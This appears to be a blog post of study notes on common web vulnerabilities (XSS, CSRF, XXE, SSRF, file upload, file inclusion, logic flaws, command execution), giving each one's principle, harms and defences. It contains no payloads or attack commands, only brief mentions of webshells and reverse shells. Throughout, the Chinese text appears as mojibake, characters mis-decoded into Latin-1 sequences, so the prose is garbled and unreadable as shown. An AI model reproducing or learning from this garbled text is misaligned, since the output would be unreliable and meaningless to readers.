<h3 id="XSSæ¼æ´ç¯‡"><a href="#XSSæ¼æ´ç¯‡" class="headerlink" title="XSSæ¼æ´ç¯‡"></a>XSSæ¼æ´ç¯‡</h3><h4 id="1-XSSæ¼æ´åŸç†"><a href="#1-XSSæ¼æ´åŸç†" class="headerlink" title="1.XSSæ¼æ´åŸç†"></a>1.XSSæ¼æ´åŸç†</h4><p>æ¶æ„æ”»å‡»è€…<u><strong>å¾€Webé¡µé¢é‡ŒåµŒå…¥è„šæœ¬ä»£ç </strong></u>ï¼ˆ<u><strong>é€šå¸¸æ˜¯JavaScriptç¼–å†™çš„æ¶æ„ä»£ç </strong></u>ï¼‰ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚ï¼ˆæ¶æ„æ”»å‡»è€…<u><strong>åˆ©ç”¨ç½‘ç«™æ²¡æœ‰å¯¹ç”¨æˆ·æäº¤æ•°æ®è¿›è¡Œè½¬ä¹‰å¤„ç†æˆ–è€…è¿‡æ»¤ä¸è¶³çš„ç¼ºç‚¹ï¼Œè¿›è€Œæ·»åŠ ä¸€äº›ä»£ç </strong></u>ï¼ŒåµŒå…¥åˆ°webé¡µé¢ä¸­å»ã€‚ï¼‰</p>
<h4 id="2-å±å®³-1"><a href="#2-å±å®³-1" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p>â‘ ç›—å–ç”¨æˆ·Cookieã€‚<br>â‘¡ä¿®æ”¹ç½‘é¡µå†…å®¹ã€‚<br>â‘¢ç½‘ç«™æŒ‚é©¬ã€‚<br>â‘£åˆ©ç”¨ç½‘ç«™é‡å®šå‘ã€‚<br>â‘¤XSSè •è™«ã€‚</p>
<h4 id="3-é˜²å¾¡-1"><a href="#3-é˜²å¾¡-1" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><p>â‘ è¿‡æ»¤è¾“å…¥çš„æ•°æ®ï¼šåŒ…æ‹¬â€ â€™ â€ã€â€&lt;â€ã€â€œ&lt;â€ã€â€œ&gt;â€ã€â€œonâ€ç­‰éæ³•å­—ç¬¦ã€‚<br>â‘¡å¯¹è¾“å‡ºåˆ°é¡µé¢çš„æ•°æ®è¿›è¡Œç›¸åº”çš„ç¼–ç è½¬æ¢ï¼ŒåŒ…æ‹¬htmlå®ä½“ç¼–ç ã€javascriptç¼–ç ç­‰ã€‚</p>
<hr>
<h3 id="CSRFæ¼æ´ç¯‡"><a href="#CSRFæ¼æ´ç¯‡" class="headerlink" title="CSRFæ¼æ´ç¯‡"></a>CSRFæ¼æ´ç¯‡</h3><h4 id="1-CSRFæ¼æ´åŸç†"><a href="#1-CSRFæ¼æ´åŸç†" class="headerlink" title="1.CSRFæ¼æ´åŸç†"></a>1.CSRFæ¼æ´åŸç†</h4><p>å› ä¸ºwebåº”ç”¨ç¨‹åºåœ¨ç”¨æˆ·è¿›è¡Œæ•æ„Ÿæ“ä½œæ—¶ï¼Œå¦‚ä¿®æ”¹è´¦å·å¯†ç ã€æ·»åŠ è´¦å·ã€è½¬è´¦ç­‰ï¼Œ<u><strong>æ²¡æœ‰æ ¡éªŒè¡¨å•tokenæˆ–è€…httpè¯·æ±‚å¤´ä¸­çš„refererå€¼</strong></u>ï¼ˆå¦‚æœæ‚¨<u><strong>åœ¨ç½‘é¡µ1ï¼Œç‚¹å‡»ä¸€ä¸ªé“¾æ¥åˆ°ç½‘é¡µ2</strong></u>ï¼Œå½“æµè§ˆå™¨<u><strong>è¯·æ±‚ç½‘é¡µ2æ—¶ï¼Œç½‘é¡µ1çš„URLå°±ä¼šåŒ…å«åœ¨ Referer å¤´ä¿¡æ¯</strong></u>ä¸­ï¼‰ï¼Œä»è€Œ<u><strong>å¯¼è‡´æ¶æ„æ”»å‡»è€…åˆ©ç”¨æ™®é€šç”¨æˆ·çš„èº«ä»½ï¼ˆcookieï¼‰å®Œæˆæ”»å‡»è¡Œä¸º</strong></u>ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/20210601210954715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NfcHJvZ3JhbWo=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>Csrfæ”»å‡»è¿‡ç¨‹ä¸¤ä¸ªé‡ç‚¹ï¼š<br>â‘ ç›®æ ‡ç”¨æˆ·<u><strong>å·²ç»ç™»å½•äº†ç½‘ç«™</strong></u>ï¼Œ<u><strong>èƒ½å¤Ÿæ‰§è¡Œç½‘ç«™çš„åŠŸèƒ½</strong></u>ã€‚<br>â‘¡ç›®æ ‡ç”¨æˆ·<u><strong>è®¿é—®äº†æ”»å‡»è€…æ„é€ çš„URL</strong></u>ã€‚</p>
<h4 id="2-å±å®³-2"><a href="#2-å±å®³-2" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p>â‘ ä¼ªé€ HTTPè¯·æ±‚è¿›è¡Œæœªæˆæƒæ“ä½œã€‚<br>â‘¡ç¯¡æ”¹ã€ç›—å–ç›®æ ‡ç½‘ç«™ä¸Šçš„é‡è¦ç”¨æˆ·æ•°æ®ã€‚<br>â‘¢æœªç»å…è®¸æ‰§è¡Œå¯¹ç”¨æˆ·åèª‰æˆ–è€…èµ„äº§æœ‰å®³çš„æ“ä½œï¼Œæ¯”å¦‚ï¼šæ•£æ’­ä¸è‰¯ä¿¡æ¯ã€è¿›è¡Œæ¶ˆè´¹ç­‰ã€‚<br>â‘£å¦‚æœé€šè¿‡ä½¿ç”¨ç¤¾å·¥ç­‰æ–¹å¼æ”»å‡»ç½‘ç«™ç®¡ç†å‘˜ã€ä¼šå±å®³ç½‘ç«™æœ¬èº«çš„å®‰å…¨æ€§ã€‚<br>â‘¤ä½œä¸ºå…¶ä»–æ”»å‡»å‘é‡çš„è¾…åŠ©æ”»å‡»æ‰‹æ³•ï¼Œå¿…é¡»é…åˆXSS<br>â‘¥ä¼ æ’­CSRFè •è™«</p>
<h4 id="3-é˜²å¾¡-2"><a href="#3-é˜²å¾¡-2" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><p>â‘ éªŒè¯è¯·æ±‚çš„<u><strong><code>referer</code></strong></u>å€¼ï¼Œå¦‚æœrefereræ˜¯ä»¥è‡ªå·±çš„ç½‘ç«™å¼€å¤´çš„åŸŸåï¼Œåˆ™è¯´æ˜è¯¥è¯·æ±‚æ¥è‡ªç½‘ç«™è‡ªå·±ï¼Œæ˜¯åˆæ³•çš„ã€‚<u><strong>å¦‚æœrefereræ˜¯å…¶ä»–ç½‘ç«™åŸŸåæˆ–ç©ºç™½ï¼Œå°±æœ‰å¯èƒ½æ˜¯csrfæ”»å‡»ï¼Œé‚£ä¹ˆæœåŠ¡å™¨æ‹’ç»è¯¥è¯·æ±‚</strong></u>ï¼Œä½†æ˜¯æ­¤æ–¹æ³•å­˜åœ¨è¢«ç»•è¿‡çš„å¯èƒ½ã€<u><strong>brupsuiteå¯ä»¥æŠ“åŒ…ä¿®æ”¹refererä»è€Œç»•è¿‡å‰ç«¯è¿‡æ»¤</strong></u>ã€‘ã€‚<br>â‘¡csrfæ”»å‡»ä¹‹æ‰€ä»¥èƒ½æˆåŠŸï¼Œæ˜¯å› ä¸º<u><strong>æ”»å‡»è€…ä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚</strong></u>ï¼Œæ‰€ä»¥æŠµå¾¡csrfçš„å…³é”®åœ¨äºï¼šåœ¨<u><strong>è¯·æ±‚ä¸­æ”¾å…¥æ”»å‡»è€…ä¸èƒ½ä¼ªé€ çš„è¯·æ±‚</strong></u>ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥åœ¨HTTPè¯·æ±‚ä¸­åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯<u><strong>éªŒè¯token</strong></u>ã€<u><strong>ç±»ä¼¼äºéªŒè¯ç </strong></u>ã€‘ï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰tokenæˆ–è€…tokenå†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºè¯·æ±‚å¯èƒ½æ˜¯csrfæ”»å‡»ï¼Œä»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚</p>
<hr>
<h3 id="XXEæ¼æ´ç¯‡"><a href="#XXEæ¼æ´ç¯‡" class="headerlink" title="XXEæ¼æ´ç¯‡"></a>XXEæ¼æ´ç¯‡</h3><h4 id="1-XXEæ¼æ´åŸç†"><a href="#1-XXEæ¼æ´åŸç†" class="headerlink" title="1.XXEæ¼æ´åŸç†"></a>1.XXEæ¼æ´åŸç†</h4><p>XXEæ¼æ´ï¼ˆXML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰ï¼ŒXMLç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°æ•°æ®ã€å®šä¹‰æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·å¯¹è‡ªå·±çš„æ ‡è®°è¯­è¨€è¿›è¡Œå®šä¹‰çš„æºè¯­è¨€ã€‚</p>
<p>XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬<u><strong>XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ </strong></u>ã€‚</p>
<h4 id="2-å±å®³-3"><a href="#2-å±å®³-3" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p>â‘ è¯»å–ä»»æ„æ–‡ä»¶ã€‚<br>â‘¡æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<br>â‘¢æ¢æµ‹å†…ç½‘ç«¯å£ã€‚<br>â‘£æ”»å‡»å†…ç½‘ç½‘ç«™ã€‚</p>
<h4 id="3-é˜²å¾¡-3"><a href="#3-é˜²å¾¡-3" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><p>â‘ è¿›åˆ¶ä½¿ç”¨<u><strong>å¤–éƒ¨å®ä½“</strong></u>ï¼Œä¾‹å¦‚ï¼š<br>PHPï¼šlibxml_disable_entity_loader(true)<br>â‘¡è¿‡æ»¤ç”¨æˆ·æäº¤çš„xmlæ•°æ®ï¼Œé˜²æ­¢å‡ºç°éæ³•å†…å®¹ã€‚</p>
<hr>
<h3 id="SSRFæ¼æ´ç¯‡"><a href="#SSRFæ¼æ´ç¯‡" class="headerlink" title="SSRFæ¼æ´ç¯‡"></a>SSRFæ¼æ´ç¯‡</h3><h4 id="1-SSRFæ¼æ´åŸç†"><a href="#1-SSRFæ¼æ´åŸç†" class="headerlink" title="1.SSRFæ¼æ´åŸç†"></a>1.SSRFæ¼æ´åŸç†</h4><p>å¤§éƒ½æ˜¯ç”±äº<u><strong>æœåŠ¡å™¨æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½</strong></u>ä¸”<u><strong>æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶</strong></u><strong>ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚</strong><u><strong>åˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ </strong></u>ã€‚SSRFæ˜¯åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p>
<p><img src="/2022/05/28/Web-study/image-20220802103546644.png" alt="image-20220802103546644"></p>
<p><img src="/2022/05/28/Web-study/image-20220802103603770.png" alt="image-20220802103603770"></p>
<h4 id="2-å±å®³-4"><a href="#2-å±å®³-4" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p>æ”»å‡»è€…å°±å¯ä»¥<u><strong>åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡é˜²ç«å¢™ç­‰è®¿é—®é™åˆ¶</strong></u>ï¼Œè¿›è€Œå°†å—æ„ŸæŸ“æˆ–å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨ä½œä¸ºä»£ç†è¿›è¡Œç«¯å£æ‰«æï¼Œç”šè‡³æ˜¯è®¿é—®å†…éƒ¨ç³»ç»Ÿæ•°æ®ã€‚</p>
<p>1.å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„banner ä¿¡æ¯</p>
<p>2.æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº</p>
<p>3.å¯¹å†…ç½‘ WEB åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°(å¦‚ï¼šreadmeæ–‡ä»¶)</p>
<p>4.æ”»å‡»å†…å¤–ç½‘çš„ web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ GET å‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»(å¦‚ï¼šStruts2ï¼Œsqli)</p>
<p>5.ä¸‹è½½å†…ç½‘èµ„æº(å¦‚ï¼šåˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰)</p>
<p>6.è¿›è¡Œè·³æ¿</p>
<p>7.æ— è§†cdn</p>
<p>8.åˆ©ç”¨Redisæœªæˆæƒè®¿é—®ï¼ŒHTTP CRLFæ³¨å…¥å®ç°getshell</p>
<h4 id="3-é˜²å¾¡-4"><a href="#3-é˜²å¾¡-4" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><p>â‘  é™åˆ¶è¯·æ±‚çš„ç«¯å£åªèƒ½ä¸ºwebç«¯å£ï¼Œåªå…è®¸è®¿é—®HTTPå’ŒHTTPSè¯·æ±‚ã€‚<br>â‘¡ é™åˆ¶ä¸èƒ½è®¿é—®å†…ç½‘çš„IPï¼Œä»¥é˜²æ­¢å¯¹å†…ç½‘è¿›è¡Œæ”»å‡»ã€‚<br>â‘¢ å±è”½è¿”å›çš„è¯¦ç»†ä¿¡æ¯ã€‚<br>â‘£ é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºHTTPå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ 80,443,8080,8088ç­‰ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:</span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">fsockopen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">curl_exec</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></div>

<hr>
<h3 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´ç¯‡"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´ç¯‡" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´ç¯‡"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´ç¯‡</h3><h4 id="1-æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†"><a href="#1-æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†" class="headerlink" title="1.æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†"></a>1.æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†</h4><p>å°±æ˜¯æœªå¯¹ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œå¯¼è‡´æŸäº›åˆ«æœ‰ç”¨å¿ƒçš„ç”¨æˆ·ä¸Šä¼ äº†ä¸€äº›æ¶æ„ä»£ç æˆ–æ–‡ä»¶ï¼ˆaspã€phpã€jspç­‰ï¼‰ï¼Œä»è€Œæ§åˆ¶äº†ç½‘ç«™ã€‚ï¼ˆå½“æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå¦‚æœæœåŠ¡ç«¯çš„è„šæœ¬è¯­è¨€æ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œé‚£å‡å¦‚ï¼Œæ¸—é€è€…ç›´æ¥ä¸Šä¼ æ¶æ„ä»£ç æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ç›´æ¥æ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œæˆ–è€…è¯´ä»¥æ­¤ä¸ºè·³æ¿ï¼Œç›´æ¥æ‹¿ä¸‹æœåŠ¡å™¨ï¼Œè¿™å°±æ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ï¼‰</p>
<h4 id="2-å±å®³-5"><a href="#2-å±å®³-5" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p><u><strong>éæ³•ç”¨æˆ·å¯ä»¥åˆ©ç”¨æ¶æ„è„šæœ¬æ–‡ä»¶æ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œç”šè‡³æ§åˆ¶æœåŠ¡å™¨</strong></u>ã€‚è¿™ä¸ªæ¶æ„è„šæœ¬æ–‡ä»¶ï¼Œåˆç§°ä¸ºwebshellï¼Œä¹Ÿå¯å°†webshellè„šæœ¬ç§°ä¸ºä¸€ç§ç½‘é¡µåé—¨ï¼Œwebshellè„šæœ¬å…·æœ‰å¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œ<u><strong>æ¯”å¦‚æŸ¥çœ‹æœåŠ¡å™¨ç›®å½•ã€æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ï¼Œæ‰§è¡Œç»•è¿‡å‘½ä»¤ç­‰ã€‚</strong></u>ã€<strong>ç”¨èšå‰‘æˆ–èœåˆ€è¿æ¥ä¸Šä¼ çš„ phpæ–‡ä»¶ï¼Œè¾“å…¥æ–‡ä»¶ä¸­çš„å¯†ç </strong>ã€‘</p>
<h4 id="3-é˜²å¾¡-5"><a href="#3-é˜²å¾¡-5" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><p>â‘ é€šè¿‡ç™½åå•æ–¹å¼åˆ¤æ–­æ–‡ä»¶åç¼€æ˜¯å¦åˆæ³•ã€‚<br>â‘¡å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚</p>
<hr>
<h3 id="æ–‡ä»¶åŒ…å«æ¼æ´ç¯‡"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´ç¯‡" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´ç¯‡"></a>æ–‡ä»¶åŒ…å«æ¼æ´ç¯‡</h3><p><a href="#%E4%B8%83%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">æ–‡ä»¶åŒ…å«æ¼æ´çŸ¥è¯†ç‚¹è®°å½•</a></p>
<h4 id="1-æ–‡ä»¶åŒ…å«æ¼æ´åŸç†"><a href="#1-æ–‡ä»¶åŒ…å«æ¼æ´åŸç†" class="headerlink" title="1.æ–‡ä»¶åŒ…å«æ¼æ´åŸç†"></a>1.æ–‡ä»¶åŒ…å«æ¼æ´åŸç†</h4><p>å¼€å‘äººå‘˜å°†<u><strong>éœ€è¦é‡å¤è°ƒç”¨çš„å‡½æ•°å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯¹è¯¥æ–‡ä»¶è¿›è¡ŒåŒ…å«æ˜¯äº§ç”Ÿçš„æ“ä½œ</strong></u>ã€‚è¿™æ ·ç¼–å†™ä»£ç èƒ½å‡å°‘ä»£ç å†—ä½™ï¼Œé™ä½ä»£ç åæœŸç»´æŠ¤éš¾åº¦ï¼Œä¿è¯ç½‘ç«™æ•´ä½“é£æ ¼ç»Ÿä¸€ï¼šå¯¼èˆªæ ã€åº•éƒ¨footeræ ç­‰ã€‚<u><strong>æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„å‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤æˆ–ä¸¥æ ¼å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼ŒåŒ…å«å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´äº†æ‰§è¡Œéé¢„æœŸä»£ç </strong></u>ã€‚</p>
<h4 id="2-å±å®³-6"><a href="#2-å±å®³-6" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p>â‘ è·å–æ•æ„Ÿä¿¡æ¯<br>â‘¡æ‰§è¡Œä»»æ„å‘½ä»¤<br>â‘¢è·å–æœåŠ¡å™¨æƒé™</p>
<h4 id="3-é˜²å¾¡-6"><a href="#3-é˜²å¾¡-6" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><p>â‘ å»ºè®®ç™½åå•ã€‚<br>â‘¡æŒ‡å®šè®¿é—®ä¸€å®šçš„è·¯å¾„ï¼Œå†å°†å‚æ•°æ‹¼æ¥åˆ°è·¯å¾„å½“ä¸­ã€‚</p>
<hr>
<h3 id="é€»è¾‘æ¼æ´ç¯‡"><a href="#é€»è¾‘æ¼æ´ç¯‡" class="headerlink" title="é€»è¾‘æ¼æ´ç¯‡"></a>é€»è¾‘æ¼æ´ç¯‡</h3><h4 id="1-é€»è¾‘æ¼æ´åŸç†"><a href="#1-é€»è¾‘æ¼æ´åŸç†" class="headerlink" title="1.é€»è¾‘æ¼æ´åŸç†"></a>1.é€»è¾‘æ¼æ´åŸç†</h4><p>æŒ‡æ”»å‡»è€…<u><strong>åˆ©ç”¨ä¸šåŠ¡çš„è®¾è®¡ç¼ºé™·ï¼Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–ç ´åä¸šåŠ¡çš„å®Œæ•´æ€§</strong></u>ã€‚ä¸€èˆ¬å‡ºç°åœ¨<u><strong>å¯†ç ä¿®æ”¹ã€è¶Šæƒè®¿é—®ã€å¯†ç æ‰¾å›ã€äº¤æ˜“æ”¯ä»˜</strong></u>ç­‰åŠŸèƒ½å¤„ã€‚</p>
<h4 id="2-å±å®³-7"><a href="#2-å±å®³-7" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p>ä»»æ„å¯†ç ä¿®æ”¹ã€è¶Šæƒè®¿é—®ã€å¯†ç ä»»æ„æ‰¾å›ã€äº¤æ˜“æ”¯ä»˜é‡‘é¢ä»»æ„ä¿®æ”¹ç­‰</p>
<h4 id="3-é˜²å¾¡-7"><a href="#3-é˜²å¾¡-7" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><h5 id="1-ä»»æ„å¯†ç ä¿®æ”¹"><a href="#1-ä»»æ„å¯†ç ä¿®æ”¹" class="headerlink" title="1.ä»»æ„å¯†ç ä¿®æ”¹"></a>1.ä»»æ„å¯†ç ä¿®æ”¹</h5><h5 id="2-è¶Šæƒè®¿é—®"><a href="#2-è¶Šæƒè®¿é—®" class="headerlink" title="2.è¶Šæƒè®¿é—®"></a>2.è¶Šæƒè®¿é—®</h5><p>è¶Šæƒè®¿é—®æ¼æ´äº§ç”Ÿ<u><strong>ä¸»è¦åŸå› æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·çš„èº«ä»½åšåˆ¤æ–­å’Œæ§åˆ¶</strong></u>ï¼Œé˜²èŒƒè¿™ç§æ¼æ´æ—¶ï¼Œå¯ä»¥é€šè¿‡sessionæ¥æ§åˆ¶ã€‚ä¾‹å¦‚ï¼Œåœ¨ç”¨æˆ·ç™»å½•æ—¶ï¼Œå°†usernameæˆ–uidå†™å…¥åˆ°<code>session</code><u><strong>ï¼ˆä¼šè¯æ§åˆ¶ï¼ŒSessionå¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„Webé¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨Sessionå¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚ï¼‰</strong></u>ä¸­å–å‡ºä¿¡æ¯ï¼Œ<u><strong>è€Œä¸æ˜¯ä»GETæˆ–POSTå–å‡ºusername</strong></u>ï¼Œnameæ­¤æ—¶å–åˆ°çš„usernameå°±æ˜¯æ²¡æœ‰ç¯¡æ”¹çš„ã€‚</p>
<hr>
<h3 id="å‘½ä»¤æ‰§è¡Œæ¼æ´ç¯‡"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´ç¯‡" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´ç¯‡"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´ç¯‡</h3><h4 id="1-å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†"><a href="#1-å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†" class="headerlink" title="1.å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†"></a>1.å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†</h4><p>åº”ç”¨æœªå¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼çš„æ£€æŸ¥è¿‡æ»¤ï¼Œå¯¼è‡´ç”¨æˆ·<u><strong>è¾“å…¥çš„å‚æ•°è¢«å½“æˆå‘½ä»¤æ¥æ‰§è¡Œ</strong></u>ã€‚æ”»å‡»è€…å¯ä»¥ä»»æ„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå±äºé«˜å±æ¼æ´ä¹‹ä¸€ï¼Œä¹Ÿå±äºä»£ç æ‰§è¡Œçš„èŒƒç•´ã€‚</p>
<h4 id="2-å±å®³-8"><a href="#2-å±å®³-8" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p>â‘ ç»§æ‰¿webæœåŠ¡ç¨‹åºçš„æƒé™å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è¯»å†™æ–‡ä»¶ã€‚<br>â‘¡åå¼¹shellï¼Œè·å¾—ç›®æ ‡æœåŠ¡å™¨çš„æƒé™ã€‚<br>â‘¢è¿›ä¸€æ­¥å†…ç½‘æ¸—é€ã€‚</p>
<h4 id="3-é˜²å¾¡-8"><a href="#3-é˜²å¾¡-8" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><p>â‘ å°½é‡ä¸è¦ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°ã€‚<br>â‘¡å®¢æˆ·ç«¯<u><strong>æäº¤çš„å˜é‡åœ¨è¿›å…¥æ‰§è¡Œå‘½ä»¤å‡½æ•°å‰</strong></u>è¦åšå¥½<u><strong>è¿‡æ»¤å’Œæ£€æµ‹</strong></u>ã€‚<br>â‘¢åœ¨<u><strong>ä½¿ç”¨åŠ¨æ€å‡½æ•°ä¹‹å‰</strong></u>ï¼Œç¡®ä¿ä½¿ç”¨å‡½æ•°æ˜¯<u><strong>æŒ‡å®šçš„å‡½æ•°</strong></u>ä¹‹ä¸€ã€‚<u><strong>ã€é˜²æ­¢æ”»å‡»è€…å¼•å…¥æ–°å‡½æ•°ï¼ˆéç½‘ç«™ä½¿ç”¨çš„å‡½æ•°ï¼‰æ‰§è¡Œæ”»å‡»è¯­å¥ã€‘</strong></u><br>â‘£å¯¹<u><strong>phpè¯­è¨€</strong></u>è€Œè¨€ï¼Œ<u><strong>ä¸èƒ½å®Œå…¨æ§åˆ¶çš„å±é™©å‡½æ•°æœ€å¥½ä¸è¦ä½¿ç”¨</strong></u>ã€‚</p>
<hr>
